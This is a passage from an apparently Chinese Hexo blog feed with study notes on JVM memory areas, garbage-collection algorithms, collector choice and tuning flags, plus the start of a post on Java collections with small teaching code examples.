Register）中，Register的命名起源于CPU的寄存器，寄存器存储指令相关的现场信息。<br>它是一块很小的内存空间，几乎可以忽略不计。也是运行速度最快的存储区域。<br>在JVM规范中，每个线程都有它自己的程序计数器，是线程私有的，生命周期与线程的生命周期保持一致。<br>任何时间一个线程都只有一个方法在执行，也就是所谓的当前方法。程序计数器会存储当前线程正在执行的Java方法的JVM指令地址；或者，如果是在执行native方法时，则是未指定值（undefined）。<br>它是程序控制流的指示器，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令。<br>它是唯一一个在Java虚拟机规范中没有规定任何OOM情况的区域。<br>作用<br>程序计数器用来存储指向下一条指令的地址，也就是即将要执行的指令代码。由执行引擎读取下一条指令。</p><h3 id="虚拟机栈（Stack）"><a href="#虚拟机栈（Stack）" class="headerlink" title="虚拟机栈（Stack）"></a>虚拟机栈（Stack）</h3><p>概述<br>Java虚拟机栈是线程私有的，用于存储栈帧。每个方法在执行的同时都会创建一个栈帧，用于存储局部变量表、操作数栈、动态链接、方法出口等。每一个方法从调用直至方法执行完成的过程，就对应着一个栈帧在虚拟机中从入栈到出栈。<br>作用<br>主管Java程序的运行，它保存方法的局部变量、部分结果，并参与方法的调用和返回。<br>栈中发生的异常有<br>StackOverflowError、OutOfMemoryError<br>•如果线程请求分配的栈容量超过虚拟机栈允许的最大容量，Java虚拟机将会抛出一个stackoverflowError 异常。<br>•如果虚拟机栈可以动态扩展，并且在尝试扩展的时候无法申请到足够的内存，或者在创建新的线程时没有足够的内存去创建对应的虚拟机栈，那么Java虚拟机将会抛出一个outofMemoryError异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 演示栈中的异常：StackOverflowError </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StackErrorTest</span>&#123;</span><br><span class="line">    privatestaticintcount = <span class="number">1</span>;</span><br><span class="line">    publicstaticvoidmain(String[] args)&#123;</span><br><span class="line">        System.out.println(count++);</span><br><span class="line">        main(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置栈内存大小<br>我们可以使用参数 -Xss选项来设置线程的最大栈空间，栈的大小直接决定了函数调用的最大可达深度<br>-Xss256k</p><h3 id="本地方法栈（Native-Method-Stack）"><a href="#本地方法栈（Native-Method-Stack）" class="headerlink" title="本地方法栈（Native Method Stack）"></a>本地方法栈（Native Method Stack）</h3><p>概述<br>本地方法栈与虚拟机栈类似，唯一的区别就是：Java虚拟机栈用于管理Java方法的调用，而本地方法栈用于管理本地方法的调用。<br>注：本地方法是使用C语言实现的</p><h3 id="堆（Heap）"><a href="#堆（Heap）" class="headerlink" title="堆（Heap）"></a>堆（Heap）</h3><p>概述<br>堆是线程共享的。用于存放对象实例，几乎所有的对象实例都在这里分配内存。堆也是Java内存管理的核心区域，所以有时候也称之为 ”GC堆“。<br>设置堆内存大小<br>堆内存的大小是可以调节的，通过-Xms、-Xmx参数来设置<br>-Xms20m -Xmx20m （表示最小内存20兆，最大内存20兆）<br>通常会将-Xms和-Xmx两个参数配置相同的值，其目的是为了能够在Java垃圾回收机制清理完堆区后不需要重新分隔计算堆区的大小，从而提高性能。<br>默认情况下<br>•初始内存大小：物理电脑内存大小&#x2F;64<br>•最大内存大小：物理电脑内存大小&#x2F;4<br>如何查看堆内存的内存分配情况<br>jps -&gt; jstat -gc 进程id<br>&#x2F;&#x2F; 或者在程序运行时，通过配置运行参数-XX:+PrintGCDetails<br>堆内存细分<br>Java7及之前堆内存逻辑上分为三部分：新生区（Young&#x2F;New）+养老区（Old&#x2F;Tenure）+永久区（Permanent Space）<br>Java8及之后堆内存逻辑上分为三部分：新生区（Young&#x2F;New）+养老区（Old&#x2F;Tenure）+元空间（Meta Space）<br>•新生区又被划分为Eden区和Survivor区（From 和 To）<br>•Eden：From：To -&gt; 8 : 1 : 1<br>•新生区：老年区 - &gt; 1 : 2<br>可通过参数配置各区在堆结构中的占比：<br>•默认-XX:NewRatio&#x3D;2，表示新生代占1，老年代占2，新生代占整个堆的1&#x2F;3<br>•可以修改-XX:NewRatio&#x3D;4，表示新生代占1，老年代占4，新生代占整个堆的1&#x2F;5<br>•-xx:SurvivorRatio&#x3D;8，表示Eden空间和另外两个survivor空间所占的比例是8：1：1<br>当发现在整个项目中，生命周期长的对象偏多，那么就可以通过调整 老年代的大小，来进行调优<br>•几乎所有的Java对象都是在Eden区被new出来的。<br>•绝大部分的Java对象的销毁都在新生代进行了。（有些大的对象在Eden区无法存储时候，将直接进入老年代）<br>•IBM公司的专门研究表明，新生代中80%的对象都是“朝生夕死”的。<br>•可以使用选项”-Xmn”设置新生代最大内存大小（一般不使用）<br>•可以设置参数：-Xx:MaxTenuringThreshold&#x3D; N 进行设置新生代进入老年代的年龄<br>堆空间相关的参数设置<br>•-XX：+PrintFlagsInitial：查看所有的参数的默认初始值<br>•-XX：+PrintFlagsFinal：查看所有的参数的最终值（可能会存在修改，不再是初始值）<br>•-Xms：初始堆空间内存（默认为物理内存的1&#x2F;46）<br>•-Xmx：最大堆空间内存（默认为物理内存的1&#x2F;4）<br>•-Xmn：设置新生代的大小（初始值及最大值）<br>•-XX:NewRatio：配置新生代与老年代在对结构的占比<br>•-XX:SurvivorRatio：设置新生代中Eden和S0和S1空间的占比<br>•-XX:MaxTenuringThreshold：设置新生代垃圾的最大年龄<br>•-XX: +PrintGCDetails：输出详细的GC处理日志<br>•打印gc简要信息：①-Xx: +PrintGC ② -verbose:gc<br>•-XX:HandlePromotionFailure：是否设置空间分配担保</p><p>我们创建的对象，一般都是存放在Eden区，当Eden区满了之后，就会触发GC操作，这个操作一般会称为YGC&#x2F;Minor GC.</p><p>我们继续不断的进行对象生成 和 垃圾回收，当Survivor中的对象的年龄达到15的时候，将会触发一次 Promotion晋升的操作，也就是将年轻代中的对象 晋升到 老年代中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码演示对象分配过程</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 内存分配过程演示</span></span><br><span class="line"><span class="comment"> * 设置内存大小：-Xms600m -Xmx600m</span></span><br><span class="line"><span class="comment"> * 通过 jvisualvm 查看内存分布</span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapInstanceTest</span>&#123;</span><br><span class="line">    <span class="type">byte</span>[] buffer = newbyte[<span class="number">1024</span>* <span class="number">200</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        ArrayList&lt;HeapInstanceTest&gt; list = newArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            list.add(newHeapInstanceTest());</span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法区（Method-Area）"><a href="#方法区（Method-Area）" class="headerlink" title="方法区（Method Area）"></a>方法区（Method Area）</h3><p>概述：是线程共享的，用于存储已被虚拟机加载的类型信息、常量、静态变量、即时编译器编译后的代码缓存等。<br>方法区主要存放的是 Class，而堆中主要存放的是 实例化的对象。<br>•方法区与Java堆一样，是各个线程共享的内存区域<br>•方法区在JVM启动的时候创建，并且它的实际的物理内存空间中和Java堆区一样都可以是不连续的<br>•方法区的大小，跟堆空间一样，可以选择固定大小或者可扩展<br>•方法区的大小决定了系统可以保存多少个类，如果系统定义了太多的类，导致方法区溢出，虚拟机同样会抛出内存溢出错误：java.lang.OutofMemoryError:PermGen space 或者java.lang.OutOfMemoryError:Metaspace<br>    加载大量的第三方的jar包<br>    Tomcat部署的工程过多（30~50个）<br>    大量动态的生成反射类<br>•关闭JVM就会释放这个区域的内存<br>方法区的演进<br>首先只有HotSpot才有永久代<br>jdk版本变化<br>jdk1.6及之前有永久代（permanent generation），静态变量存放在永久代上<br>jdk1.7有永久代，但已经逐步“去永久代”，字符串常量池、静态变量移除，保存在堆中<br>jdk1.8及之后无永久代，类型信息、字段、方法、常量保存在本地内存的元空间，但字符串常量池、静态变量仍在堆中<br>元空间的本质和永久代类似，都是对JVM规范中方法区的实现。不过元空间与永久代最大的区别在于：元空间不在虚拟机设置的内存中，而是使用本地内存<br>永久代、元空间二者并不只是名字变了，内部结构也调整了<br>永久代为什么要被元空间替代？<br>1.为永久代设置空间大小很难确定的（而元空间在本地内存中，没有这个问题）<br>2.对永久代进行调优是很困难的（方法区的垃圾收集主要回收两部分内容：常量池中废弃的常量和不在使用的类型）</p><h2 id="垃圾回收（GC）"><a href="#垃圾回收（GC）" class="headerlink" title="垃圾回收（GC）"></a>垃圾回收（GC）</h2><p>•什么是垃圾？<br>•为什么要垃圾回收？<br>•Java垃圾回收机制</p><h3 id="什么是垃圾"><a href="#什么是垃圾" class="headerlink" title="什么是垃圾"></a>什么是垃圾</h3><p>垃圾是指在运行程序中没有任何指向的对象，这个对象就是需要被回收的垃圾。</p><h3 id="为什么需要垃圾回收"><a href="#为什么需要垃圾回收" class="headerlink" title="为什么需要垃圾回收"></a>为什么需要垃圾回收</h3><p>如果不及时对内存中的垃圾进行清理，那么，这些垃圾对象所占的内存空间就会一直保留到应用程序的结束，被保留的空间无法被其他对象使用，久而久之就会导致内存溢出。<br>除了释放没用的对象，垃圾回收也可以清除内存里的记录碎片。碎片整理所占用的堆内存移到堆的一端，以便JVM将整理出的内存分配给新的对象。</p><h3 id="Java垃圾回收特点"><a href="#Java垃圾回收特点" class="headerlink" title="Java垃圾回收特点"></a>Java垃圾回收特点</h3><p>优点<br>•自动内存管理，无需开发人员手动参与内存的分配与回收，这样降低内存泄漏和内存溢出的风险<br>•自动内存管理，将程序员从繁重的内存管理中释放出来，可以更专注于业务开发。<br>担忧<br>对于Java开发人员而言，自动内存管理就像是一个黑匣子，如果过度依赖于”自动“，那么最严重的情况就是会弱化Java开发人员在程序出现内存溢出时，定位问题和解决问题的能力。<br>此时，了解JVM的自动内存分配和内存回收原理就显得非常重要，只有真正了解JVM是如何管理内存后，我们才能在遇见OOM时，快速地根据错误日志定位问题和解决问题。<br>当需要排查各种内存溢出、内存泄漏问题时，当垃圾收集成为系统达到更高并发量的瓶颈时，我们就必须对这些“自动化”的技术实施必要的监控和调节。</p><h3 id="垃圾回收相关算法"><a href="#垃圾回收相关算法" class="headerlink" title="垃圾回收相关算法"></a>垃圾回收相关算法</h3><p>在堆里存放着几乎所有的Java对象实例，在GC执行垃圾回收之前，首先需要区分出内存中哪些是存活对象，哪些是已经死亡的对象。只有被标记为已经死亡的对象，GC才会在执行垃圾回收时，释放掉其所占用的内存空间，因此这个过程我们可以称为垃圾标记阶段。<br>那么在JVM中究竟是如何标记一个死亡对象呢？简单来说，当一个对象已经不再被任何的存活对象继续引用时，就可以宣判为已经死亡。<br>判断对象存活一般有两种方式：引用计数算法和可达性分析算法。<br><strong>标记阶段：引用计数算法</strong><br>引用计数算法（Reference Counting）比较简单，对每个对象保存一个整型的引用计数器属性。用于记录对象被引用的情况。<br>对于一个对象A，只要有任何一个对象引用了A，则A的引用计数器就加1；当引用失效时，引用计数器就减1。只要对象A的引用计数器的值为0，即表示对象A不可能再被使用，可进行回收。<br>优点：实现简单，垃圾对象便于辨识；判定效率高，回收没有延迟性。<br>缺点：a.它需要单独的字段存储计数器，这样的做法增加了存储空间的开销。b.每次赋值都需要更新计数器，伴随着加法和减法操作，这增加了时间开销。c.引用计数器还有一个严重问题，即无法处理循环引用的情况。这是一条致命的缺陷，导致在Java的垃圾回收器中没有使用这类标记方法。<br>循环引用<br>当Obj1对象的指针断开的时候，内部的引用形成一个循环，这就是循环引用，从而造成内存泄漏。<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 引用计数算法测试</span></span><br><span class="line"><span class="comment"> * 运行时参数：-XX:+PrintGCDetails</span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefCountGC</span>&#123;</span><br><span class="line">    <span class="comment">// 引用Object reference = null;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">RefCountGC</span> <span class="variable">obj1</span> <span class="operator">=</span> newRefCountGC();</span><br><span class="line">        <span class="type">RefCountGC</span> <span class="variable">obj2</span> <span class="operator">=</span> newRefCountGC();</span><br><span class="line">        obj1.reference = obj2;</span><br><span class="line">        obj2.reference = obj1;</span><br><span class="line">        obj1 = <span class="literal">null</span>;</span><br><span class="line">        obj2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 显示的执行垃圾收集行为，判断obj1 和 obj2是否被回收？System.gc();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>标记阶段：可达性分析算法</strong><br>概述<br>可达性分析算法：也可称为根搜索算法、追踪性垃圾收集（Tracing Garbage Collection）算法<br>相对于引用计数算法而言，可达性分析算法不仅同样具备实现简单和执行高效等特点，更重要的是该算法可以有效地解决在引用计数算法中循环引用的问题，防止内存泄漏的发生。<br>基本思路<br>1.可达性分析算法是以根对象集合（GCRoots）为起始点，按照从上至下的方式搜索被根对象集合所连接的目标对象是否可达。<br>2.使用可达性分析算法后，内存中的存活对象都会被根对象集合直接或间接连接着，搜索所走过的路径称为引用链（Reference Chain）<br>3.如果目标对象没有任何引用链，则是不可达的，就意味着该对象已经死亡，可以标记为垃圾对象。<br>4.在可达性分析算法中，只有能够被根对象集合直接或者间接连接的对象才是存活对象。</p><p><strong>GC Roots可以是哪些？</strong><br>在HotSpot中，根对象集合中包含了5个元素：<br>Java栈内的对象引用、本地方法栈内的对象应用、运行时常量池中的对象引用、方法区中类静态属性的对象引用以及与一个类对应的唯一数据类型的Class对象。</p><p>当成功区分出内存中存活对象和死亡对象后，GC接下来的任务就是执行垃圾回收，释放掉无用对象所占用的内存空间，以便有足够的可用空间为新对象分配内存。目前在JVM中比较常见的三种垃圾收集算法是：<br>•标记-清除算法（Mark-Sweep）<br>•复制算法（Copying）<br>•标记-整理算法（Mark-Compact）<br><strong>清除阶段：标记-清除算法</strong><br>标记清除算法是一种非常基础和常见的垃圾收集算法，该算法被 J.McCarthy等人在1960年提出并应用于Lisp语言。<br>执行过程<br>当堆中的有效内存空间被耗尽的时候，就会停止整个程序（也被称为stop the world），然后进行两项工作，第一项是标记，第二项则是清除。<br>•标记：Collector从引用根节点开始遍历，标记所有被引用的对象。一般是在对象的Header中记录为可达对象。<br>    标记的是引用的对象，不是垃圾！！<br>•清除：Collector对堆内存从头到尾进行线性的遍历，如果发现某个对象在其Header中没有标记为可达对象，则将其回收</p><p>什么是清除？<br>这里所谓的清除并不是真的置空，而是把需要清除的对象地址保存在空闲的地址列表。下次有新对象需要加载时，判断垃圾的位置空间是否够，如果够，就存放覆盖原有的地址。<br>关于空闲列表：<br>•如果内存规整<br>    采用指针碰撞的方式进行内存分配<br>•如果内存不规整<br>    虚拟机需要维护一个列表<br>    空闲列表分配<br>缺点<br>•标记清除算法的效率不算高<br>•在进行GC的时候，需要停止整个应用程序，用户体验差<br>•这种方式清理出来的空闲内存是不连续的，产生内存碎片，需要维护一个空闲列表<br><strong>清除阶段：复制算法</strong><br>背景<br>为了解决标记-清除算法在垃圾收集效率方面的缺陷，M.L.Minsky在1963年发表了著名的论文，“使用双存储区的Lisp语言垃圾收集器”。M.L.Minsky在该论文中描述的算法被人们称为复制算法，它也被M.L.Minsky本人成功地引入到了Lisp语言的一个实现版本中。<br>核心思想<br>将活着的内存空间分为两块，每次只是用其中一块，在垃圾回收时将正在使用的内存中的存活对象复制到未被使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，最后完成垃圾回收。</p><p>把可达的对象，直接复制到另外一个区域中复制完成后，A区就没有用了，里面的对象可以直接清除掉，其实堆中的的新生代就用到了复制算法</p><p>优点<br>•没有标记和清除过程，实现简单，运行高效<br>•复制过去以后保证空间的连续性，不会出现“碎片”问题<br>缺点<br>•此算法的缺点也是很明显的，就是需要两倍的内存空间（或者说内存浪费严重）<br>•对于G1这种分拆成为大量region的GC，复制而不是移动，意味着GC需要维护region之间对象引用关系，不管是内存占用或者时间开销也不小<br>注意<br>如果系统中的垃圾对象很多，复制算法不是很理想。因为复制算法需要复制的存活对象数量不能太大，或者说非常低才行（老年代大量的对象存活，那么复制的对象将会有很多，效率就会很低）<br>应用场景<br>在新生代，对常规应用的垃圾回收，一次通常可以回收70% - 99%的内存空间。回收性价比很高。所以现在的商业虚拟机都是用这种收集算法回收新生代。<br><strong>清除阶段：标记-整理算法（也叫标记-压缩算法）</strong><br>背景<br>复制算法的高效性是建立在存活对象少、垃圾对象多的前提下的。这种情况在新生代经常发生，但是在老年代，更常见的情况是大部分对象都是存活对象，如果依然使用复制算法，由于存活对象较多，复制的成本也将很高。因此，基于老年代垃圾回收的特性，需要使用其他的算法。<br>标记-清除算法的确可以应用在老年代，但是该算法不仅执行效率低下，而且在执行玩内存回收后还会产生内存碎片，所以JVM的设计者需要再次基础上进行改进。标记-压缩算法由此诞生。<br>1970年前后，G.L.Steele、C.J.Chene和D.s.Wise等研究者发布标记-整理算法。在许多现代的垃圾收集器中，人们都使用了标记-整理算法或其改进版本。<br>执行过程<br>第一阶段和标记清除算法一样，从根节点开始标记所有被引用的对象<br>第二阶段将所有的存活对象压缩到内存的一端，按顺序排放。之后，清理边界外所有的空间。</p><p>标记清除和标记整理的区别<br>标记-整理算法的最终效果等同于标记-清除算法执行完成之后，再进行一次内存碎片整理，因此，也可以把它称为标记-清除-整理算法。<br>二者的本质差异在于标记-清除算法是一种非移动式的回收算法，标记-整理是移动式的。是否移动回收后的存活对象是一项优缺点并存的风险决策。可以看到，标记的存活对象会被整理，按照内存地址依次排列，而未标记的内存会被清理掉。如此一来，当我们需要给新对象分配内存时，JVM只需要持有一个内存的起始地址即可，这比维护一个空闲列表显然少了许多开销。<br>标记-整理的优缺点<br>优点<br>•消除了标记-清除算法当中，内存区域分散的缺点，没有碎片的问题，我们需要给新对象分配内存时，JVM只需要持有一个内存的起始地址即可。<br>•消除了复制算法当中，内存减半的高额代价。<br>缺点<br>•从效率上来说，标记-整理算法要低于复制算法<br>•移动对象的同时，如果对象被其他对象引用，则还需要调整引用的地址<br>•移动过程中，需要全程暂停用户应用程序。即：STW<br>小结<br>效率上来说，复制算法是当之无愧的老大，但是却浪费了太多内存。<br>而综合来看，标记-整理算法相对来说更好一些，但是效率上不尽如人意，它比复制算法多了一个标记的阶段，比标记-清除多了一个整理内存的阶段。</p><table><thead><tr><th></th><th>标记清除</th><th>标记整理</th><th>复制</th></tr></thead><tbody><tr><td>速率</td><td>中等</td><td>最慢</td><td>最快</td></tr><tr><td>空间开销</td><td>少（但会堆积碎片）</td><td>少（不堆积碎片）</td><td>通常需要活对象的2倍空间（不堆积碎片）</td></tr><tr><td>移动对象</td><td>否</td><td>是</td><td>是</td></tr></tbody></table><p>ps：没有最好的算法，只有最合适的算法</p><h2 id="垃圾回收器"><a href="#垃圾回收器" class="headerlink" title="垃圾回收器"></a>垃圾回收器</h2><h3 id="垃圾收集器分类"><a href="#垃圾收集器分类" class="headerlink" title="垃圾收集器分类"></a>垃圾收集器分类</h3><p>按线程数分：串行垃圾回收器和并行垃圾回收器</p><p>串行回收指的是在同一时间段内只允许有一个CPU用于执行垃圾回收操作，此时工作线程被暂停，直至垃圾收集工作结束。<br>•在诸如单CPU或者较小的应用内存等硬件平台不是特别优越的场合，串行回收器的性能表现可以超过并行回收器和并发回收器。所以，串行回收默认被应用在客户端的Client模式下的JVM中。<br>•在并发能力比较强的CPU上，并行回收器产生的停顿时间要短于串行回收器。<br>和串行相反，并行收集可以运用多个CPU同时执行垃圾回收，因此提升了应用的吞吐量，不过并行回收仍然与串行回收一样，采用独占式，使用了“stop-the-world”机制。<br>按工作模式分：并发式垃圾回收器和独占式垃圾回收器<br>•并发式垃圾回收器与应用程序线程交替工作，以尽可能减少应用程序的停顿时间。<br>•独占式垃圾回收器一旦运行，就停止应用程序中的所有用户线程，直到垃圾回收过程完全结束。</p><p>按碎片处理方式分：压缩式垃圾回收器和非压缩式垃圾回收器<br>•压缩式垃圾回收器会在回收完成后，对存活对象进行压缩整理，消除回收后的碎片<br>•非压缩式的垃圾回收器不进行这步操作<br>按工作的内存空间分：年轻代垃圾回收器和老年代垃圾回收器<br>不同的垃圾回收器概述<br>垃圾收集机制是Java的招牌能力，极大地提高了开发效率。</p><h3 id="7种经典的垃圾收集器"><a href="#7种经典的垃圾收集器" class="headerlink" title="7种经典的垃圾收集器"></a>7种经典的垃圾收集器</h3><p>•串行回收器：Serial、Serial Old<br>•并行回收器：ParNew、Parallel Scavenge、Parallel Old<br>•并发回收器：CMS、G1</p><p>ps: jdk8默认的是 Parallel Scavenge&#x2F;Parallel Old<br>-XX:+PrintcommandLineFlags：查看命令行相关参数（包含使用的垃圾收集器）</p><p>为什么要有很多收集器，一个不够吗？ 因为Java的使用场景很多，移动端，服务器等。所以就需要针对不同的场景，提供不同的垃圾收集器，提高垃圾收集的性能。<br>虽然我们会对各个收集器进行比较，但并非为了挑选一个最好的收集器出来。没有一种放之四海皆准、任何场景下都适用的完美收集器存在，更加没有万能的收集器。所以我们选择的只是对具体应用最合适的收集器。</p><h3 id="垃圾回收器总结"><a href="#垃圾回收器总结" class="headerlink" title="垃圾回收器总结"></a>垃圾回收器总结</h3><p>7款不同的垃圾收集器。每一款的垃圾收集器都有不同的特点，在具体使用的时候，需要根据具体的情况选用不同的垃圾收集器。<br> <img src="/upload/2022/03/image-b99416b8adee4b799b01d3530676adf8.png" alt="image.png"><br>GC发展阶段：Serial &#x3D;&gt; Parallel（并行）&#x3D;&gt; CMS（并发）&#x3D;&gt; G1 &#x3D;&gt; ZGC</p><h3 id="怎么选择垃圾回收器"><a href="#怎么选择垃圾回收器" class="headerlink" title="怎么选择垃圾回收器"></a>怎么选择垃圾回收器</h3><p>Java垃圾收集器的配置对于JVM优化来说是一个很重要的选择，选择合适的垃圾收集器可以让JVM的性能有一个很大的提升。怎么选择垃圾收集器？<br>•优先调整堆的大小让JVM自适应完成。<br>•如果内存小于100M，使用串行收集器<br>•如果是单核、单机程序，并且没有停顿时间的要求，串行收集器<br>•如果是多CPU、需要高吞吐量、允许停顿时间超过1秒，选择并行或者JVM自己选择<br>•如果是多CPU、追求低停顿时间，需快速响应（比如延迟不能超过1秒，如互联网应用），使用并发收集器<br>•官方推荐G1，性能高。现在互联网的项目，基本都是使用G1。<br>最后需要明确一个观点：<br>•没有最好的收集器，更没有万能的收集器<br>•调优永远是针对特定场景、特定需求，不存在一劳永逸的收集器</p><h3 id="常见垃圾回收器组合参数设定：-1-8"><a href="#常见垃圾回收器组合参数设定：-1-8" class="headerlink" title="常见垃圾回收器组合参数设定：(1.8)"></a>常见垃圾回收器组合参数设定：(1.8)</h3><p>•-XX:+UseSerialGC &#x3D; Serial New (DefNew) + Serial Old<br>    小型程序。默认情况下不会是这种选项，HotSpot会根据计算及配置和JDK版本自动选择收集器<br>•-XX:+UseParNewGC &#x3D; ParNew + SerialOld<br>    这个组合已经很少用（在某些版本中已经废弃）<br>•-XX:+UseConc(urrent)MarkSweepGC &#x3D; ParNew + CMS + Serial Old<br>•-XX:+UseParallelGC &#x3D; Parallel Scavenge + Parallel Old (1.8默认) [PS + SerialOld]<br>•-XX:+UseParallelOldGC &#x3D; Parallel Scavenge + Parallel Old<br>•-XX:+UseG1GC &#x3D; G1<br>•Linux中没找到默认GC的查看方法，而windows中会打印UseParallelGC<br>    java +XX:+PrintCommandLineFlags -version<br>    通过GC的日志来分辨<br>•Linux下1.8版本默认的垃圾回收器到底是什么？<br>    1.8.0_181 默认（看不出来）Copy MarkCompact<br>    1.8.0_222 默认 PS + PO</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java集合详解（源码分析）</title>
    <link href="/2023/06/18/Java%E9%9B%86%E5%90%88%E8%AF%A6%E8%A7%A3%EF%BC%88%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <url>/2023/06/18/Java%E9%9B%86%E5%90%88%E8%AF%A6%E8%A7%A3%EF%BC%88%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="集合框架体系"><a href="#集合框架体系" class="headerlink" title="集合框架体系"></a>集合框架体系</h2><p>数组：<br>长度开始时必须指定，而且一旦指定，不能修改<br>保存的必须为同一类型的元素<br>使用数组进行增加&#x2F;删除元素比较麻烦</p><p>集合：<br>可以动态保存任意多个对象，使用比较方便<br>提供了一系列方便操作对象的方法： add、remove、set、get<br>使用集合添加，删除新元素的代码简洁明了</p><p>Collection体系图<br><img src="/upload/2022/04/image-669a383adce24b93a16ce4cc5789c92b.png" alt="image.png"></p><p>Map集合体系图<br><img src="/upload/2022/04/image-afe22fd1c3764b24ac3a29d47799be9b.png" alt="image.png"></p><h2 id="Collection-接口和常用方法"><a href="#Collection-接口和常用方法" class="headerlink" title="Collection 接口和常用方法"></a>Collection 接口和常用方法</h2><h3 id="Collection接口实现类的特点"><a href="#Collection接口实现类的特点" class="headerlink" title="Collection接口实现类的特点"></a>Collection接口实现类的特点</h3><p>public interface Collection<E> extends Iterable<E></p><ol><li>collection实现子类可以存放多个元素，每个元素可以是Object</li><li>有些Collection的实现类，可以存放重复的元素，有些不可以</li><li>有些Collection的实现类，有些是有序的(List)，有些不是有序的(Set)</li><li>Collection接口没有直接的实现子类，是通过它的子接口Set和List来实现的</li></ol><h3 id="Collection接口常用方法"><a href="#Collection接口常用方法" class="headerlink" title="Collection接口常用方法"></a>Collection接口常用方法</h3><p>操作元素方法</p><ol><li>add：添加单个元素</li><li>remove：删除指定元素</li><li>contains：查找元素是否存在</li><li>size：获取元素个数</li><li>isEmpty：判断是否为空</li><li>clear：清空</li><li>addAll：添加多个元素</li><li>containsAll：查找多个元素是否都存在</li><li>removeAll：删除多个元素</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Collection 常用方法举例</span></span><br><span class="line"><span class="comment"> *    以实现子类 ArrayList举例</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollectionMethod</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"><span class="comment">//        1. add：添加单个元素</span></span><br><span class="line">        list.add(<span class="string">&quot;卡卡西&quot;</span>);</span><br><span class="line">        list.add(<span class="number">20</span>);  <span class="comment">// list.add(new Integer(10))</span></span><br><span class="line">        list.add(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;list=&quot;</span>+list);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        2. remove：删除指定元素</span></span><br><span class="line">        list.remove(<span class="number">0</span>); <span class="comment">// 按索引删除第一个元素</span></span><br><span 